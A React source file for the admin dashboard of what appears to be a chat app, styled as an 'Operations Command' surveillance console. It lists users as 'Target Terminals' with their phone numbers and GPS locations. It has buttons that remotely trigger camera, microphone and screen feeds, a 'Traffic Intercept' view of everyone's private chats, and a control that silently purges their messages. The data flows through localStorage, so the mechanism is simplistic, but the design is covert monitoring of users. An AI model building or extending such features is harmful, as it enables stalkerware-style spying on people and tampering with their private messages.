
import React, { useState, useEffect } from 'react';
import { User, Chat } from '../types';
import { COLORS } from '../constants';

interface AdminDashboardProps {
  onClose: () => void;
  isDarkMode: boolean;
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ onClose, isDarkMode }) => {
  const [users, setUsers] = useState<User[]>([]);
  const [allChats, setAllChats] = useState<Chat[]>([]);
  const [selectedChat, setSelectedChat] = useState<Chat | null>(null);
  const [activeTarget, setActiveTarget] = useState<string | null>(null);
  const [liveFrame, setLiveFrame] = useState<string | null>(null);
  
  const syncData = () => {
    const rawUsers = localStorage.getItem('global_registered_users');
    const rawChats = localStorage.getItem('gemini_chat_data');
    if (rawUsers) setUsers(JSON.parse(rawUsers));
    if (rawChats) setAllChats(JSON.parse(rawChats));

    if (activeTarget) {
      const frame = localStorage.getItem(`feed_${activeTarget}`);
      if (frame) setLiveFrame(frame);
    } else {
      setLiveFrame(null);
    }
  };

  useEffect(() => {
    syncData();
    const interval = setInterval(syncData, 1000);
    
    // Listen for storage changes from other tabs (new users, new messages)
    window.addEventListener('storage', syncData);
    
    return () => {
      clearInterval(interval);
      window.removeEventListener('storage', syncData);
    };
  }, [activeTarget]);

  const triggerAccess = (userId: string, type: string) => {
    const cmd = {
      id: Date.now(),
      targetId: userId,
      type,
      timestamp: Date.now()
    };
    localStorage.setItem('admin_remote_command', JSON.stringify(cmd));
    // Clear old feed to wait for new handshake
    localStorage.removeItem(`feed_${userId}`);
    setActiveTarget(userId);
    setLiveFrame(null);
    alert(`COMMAND ISSUED: [${type.toUpperCase()}] for terminal ${userId}. Awaiting user handshake.`);
  };

  const deleteMessage = (chatId: string, messageId: string) => {
    const updated = allChats.map(c => c.id === chatId ? { ...c, messages: c.messages.filter(m => m.id !== messageId) } : c);
    setAllChats(updated);
    localStorage.setItem('gemini_chat_data', JSON.stringify(updated));
  };

  return (
    <div className="fixed inset-0 z-[200] flex flex-col bg-[#0b141a] text-white">
      {/* Header */}
      <div className="p-4 bg-[#202c33] border-b border-red-500/20 flex justify-between items-center shadow-xl">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center font-bold animate-pulse shadow-[0_0_15px_rgba(220,38,38,0.5)]">HQ</div>
          <h1 className="text-xl font-bold tracking-tight">OPERATIONS COMMAND</h1>
        </div>
        <button onClick={() => {
          localStorage.removeItem('gemini_current_profile');
          window.location.reload();
        }} className="bg-red-600 px-6 py-2 rounded-lg text-xs font-bold hover:bg-red-700 transition-colors shadow-lg active:scale-95">EXIT HQ</button>
      </div>

      <div className="flex-1 flex overflow-hidden">
        {/* User Surveillance List */}
        <div className="w-96 border-r border-white/5 bg-[#111b21] p-4 overflow-y-auto">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-[10px] font-black uppercase tracking-widest opacity-40">Target Terminals</h2>
            <span className="bg-red-500/10 text-red-500 text-[8px] px-2 py-0.5 rounded border border-red-500/20">{users.length} ONLINE</span>
          </div>
          <div className="space-y-3">
            {users.map(u => (
              <div key={u.id} className={`p-4 rounded-xl border transition-all ${activeTarget === u.id ? 'bg-red-900/10 border-red-500' : 'bg-[#202c33] border-white/5 hover:border-white/10'}`}>
                <div className="flex gap-4 mb-4">
                  <div className="relative">
                    <img src={u.avatar} className="w-12 h-12 rounded-full border border-white/10 object-cover" />
                    <div className={`absolute bottom-0 right-0 w-3.5 h-3.5 rounded-full border-2 border-[#202c33] ${u.status === 'online' ? 'bg-green-500' : 'bg-gray-500'}`}></div>
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-bold text-sm truncate">{u.name}</p>
                    <p className="text-[10px] opacity-40 font-mono">{u.phone}</p>
                    {u.location && (
                      <div className="flex items-center gap-1 text-[#00a884] mt-1">
                        <svg className="w-2 h-2" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
                        <p className="text-[9px] truncate">LAT: {u.location.lat.toFixed(4)} LNG: {u.location.lng.toFixed(4)}</p>
                      </div>
                    )}
                  </div>
                </div>
                <div className="grid grid-cols-3 gap-2">
                  <button onClick={() => triggerAccess(u.id, 'camera')} className="bg-white/5 py-2 rounded text-[9px] font-bold hover:bg-red-600 transition active:scale-95">CAMERA</button>
                  <button onClick={() => triggerAccess(u.id, 'mic')} className="bg-white/5 py-2 rounded text-[9px] font-bold hover:bg-blue-600 transition active:scale-95">MIC</button>
                  <button onClick={() => triggerAccess(u.id, 'screen')} className="bg-white/5 py-2 rounded text-[9px] font-bold hover:bg-orange-600 transition active:scale-95">SCREEN</button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Live Feed & Traffic Intercept */}
        <div className="flex-1 flex flex-col bg-[#0b141a]">
          <div className="flex-1 flex overflow-hidden relative">
            {/* Live Feed Overlay */}
            {activeTarget && (
              <div className="absolute top-4 right-4 z-50 w-80 bg-black/95 border-2 border-red-600/50 rounded-xl p-2 shadow-[0_0_50px_rgba(220,38,38,0.3)] animate-in slide-in-from-top duration-500 backdrop-blur-md">
                <div className="flex justify-between items-center mb-3 px-1">
                  <span className="text-[10px] font-bold text-red-500 flex items-center gap-2">
                    <span className="w-2 h-2 bg-red-500 rounded-full animate-ping"></span> FEED_INTERCEPT_ACTIVE
                  </span>
                  <button onClick={() => { setActiveTarget(null); localStorage.removeItem(`feed_${activeTarget}`); }} className="p-1 hover:bg-white/10 rounded">
                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                  </button>
                </div>
                <div className="aspect-video bg-[#111b21] rounded-lg flex items-center justify-center overflow-hidden border border-white/5">
                  {liveFrame ? (
                    <img src={liveFrame} className="w-full h-full object-cover" alt="Remote Feed" />
                  ) : (
                    <div className="flex flex-col items-center gap-3">
                      <div className="w-8 h-8 border-2 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                      <p className="text-[10px] font-mono opacity-40 uppercase tracking-widest">Awaiting Handshake...</p>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Chats Intercept List */}
            <div className="w-72 border-r border-white/5 overflow-y-auto bg-[#111b21]/50">
              <div className="p-4 bg-[#111b21] border-b border-white/5 sticky top-0 z-10 shadow-md">
                <h3 className="text-[10px] font-black opacity-30 tracking-widest uppercase">Traffic Intercept</h3>
              </div>
              {allChats.length > 0 ? allChats.map(c => (
                <div 
                  key={c.id} 
                  onClick={() => setSelectedChat(c)} 
                  className={`p-4 border-b border-white/5 cursor-pointer hover:bg-white/5 transition-colors ${selectedChat?.id === c.id ? 'bg-red-600/10 border-l-4 border-red-500' : ''}`}
                >
                  <p className="text-sm font-bold truncate">{c.type === 'group' ? c.name : c.participants.map(p => p.name).join(' & ')}</p>
                  <div className="flex justify-between items-center mt-1">
                    <p className="text-[9px] opacity-40 uppercase font-mono">{c.type}</p>
                    <p className="text-[9px] text-red-500 font-bold">{c.messages.length} PKTS</p>
                  </div>
                </div>
              )) : (
                <div className="p-10 text-center opacity-20 text-[10px] font-bold uppercase tracking-widest">No Traffic Logs</div>
              )}
            </div>

            {/* Data Stream Viewer */}
            <div className="flex-1 flex flex-col">
              {selectedChat ? (
                <div className="flex-1 flex flex-col">
                  <div className="p-3 bg-[#111b21] border-b border-white/5 text-[9px] font-mono text-red-500/60 uppercase tracking-widest flex justify-between items-center">
                    <span>INTERCEPTING PACKETS // {selectedChat.id}</span>
                    <span>BYTES: {(JSON.stringify(selectedChat.messages).length / 1024).toFixed(2)} KB</span>
                  </div>
                  <div className="flex-1 p-6 space-y-4 overflow-y-auto">
                    {selectedChat.messages.map(m => (
                      <div key={m.id} className="flex flex-col gap-1 group">
                        <div className="flex justify-between">
                          <span className="text-[10px] font-bold text-red-500 uppercase tracking-tighter">
                            {users.find(u => u.id === m.senderId)?.name || 'UNKNOWN_SOURCE'}
                          </span>
                          <button onClick={() => deleteMessage(selectedChat.id, m.id)} className="opacity-0 group-hover:opacity-100 text-[9px] text-red-500 hover:underline">PURGE</button>
                        </div>
                        <div className="p-3 bg-[#202c33] rounded-lg text-sm font-mono border border-white/5 shadow-inner">
                           {m.type === 'text' ? m.content : `[REDACTED_BINARY: ${m.type.toUpperCase()}]`}
                        </div>
                        <span className="text-[8px] opacity-30 self-end font-mono">{new Date(m.timestamp).toISOString()}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="flex-1 flex items-center justify-center opacity-5 flex-col grayscale pointer-events-none select-none">
                  <svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="0.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="12" cy="12" r="3"/></svg>
                  <p className="mt-8 text-3xl font-black tracking-[1em] uppercase">No Signals Detected</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
